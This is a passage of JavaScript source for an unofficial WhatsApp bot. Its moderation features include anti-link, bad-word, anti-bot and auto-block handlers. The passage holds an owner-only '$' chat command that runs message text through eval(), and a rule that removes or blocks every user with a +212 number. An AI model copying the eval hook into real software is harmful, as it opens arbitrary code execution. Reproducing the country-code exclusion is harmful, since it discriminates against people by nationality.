            // If in a group, remove the user
            await conn.groupParticipantsUpdate(from, [sender], 'remove');
            await conn.sendMessage(from, { text: 'User with +212 number detected and removed from the group.' });
        } else {
            // If in a private chat, block the user
            await conn.updateBlockStatus(sender, 'block');
            console.log(`Blocked +212${senderNumber.slice(3)} successfully.`);
        }

        return; // Stop further processing of this message
    }

//=====================================

if (config.AUTO_BLOCK === "true" && mek.key.remoteJid.endsWith('@s.whatsapp.net')) {
    if (!mek.key.fromMe) { // Ensure the bot doesn't block itself
        console.log(`Auto-block initiated for ${mek.key.remoteJid}...`);

        try {
            // Send warnings
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 1 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 2 ❗*" });
            await conn.sendMessage(mek.key.remoteJid, { text: "*Warning 3 ❗*" });

            // Notify and block
            await conn.sendMessage(mek.key.remoteJid, { text: "*Blocked 🚫*" });
            await conn.updateBlockStatus(mek.key.remoteJid, 'block');

            console.log(`User ${mek.key.remoteJid} blocked after warnings.`);
        } catch (error) {
            console.error(`Error during auto-block for ${mek.key.remoteJid}:`, error);
        }

        return; // Stop further processing for this user
    }
}

if (config.ANTI_LINK == "true"){
        if (!isOwner && isGroup && isBotAdmins ) {   
        if (body.match(`chat.whatsapp.com`)) {
            
        if (isMe) return await reply("Link Derect but i can't Delete link")
        if(groupAdmins.includes(sender)) return
            
        await conn.sendMessage(from, { delete: mek.key })  
        }}}

const bad = await fetchJson(`https://raw.githubusercontent.com/ChethiyaMD/bad_word.json/refs/heads/main/bad_word.json`)
if (config.ANTI_BAD == "true"){
  if (!isAdmins && !isMe) {
  for (any in bad){
  if (body.toLowerCase().includes(bad[any])){  
    if (!body.includes('tent')) {
      if (!body.includes('docu')) {
        if (!body.includes('https')) {
  if (groupAdmins.includes(sender)) return 
  if (mek.key.fromMe) return   
  await conn.sendMessage(from, { delete: mek.key })  
  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
//  await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}}}}}}
	      
 if (config.ANTI_BOT == "true"){
  if ( isGroup && !isAdmins && !isMe && !isOwner && isBotAdmins ) {
  if ( mek.id.startsWith("BAE") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` 📚 *Removed By 𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯* ❗\nAnti Bot System on..." })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("QUEENAMDI") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *💃 𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯 ❗\n*🄿🄾🅆🄴🅁🄳 🅱🆈  😈 𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯* ❗\nAnti Bot System on..." })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}

  
  }
  }
  
//=============================================== 
            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:				
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}
app.get("/", (req, res) => {
res.send("🥷 𝕮𝖍𝖊𝖙𝖍𝖎𝖞𝖆_𝕸𝕯CONNECTED SUCCESSFUL💀");
});
app.listen(port, () => console.log(`Chethiya_MD Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
    
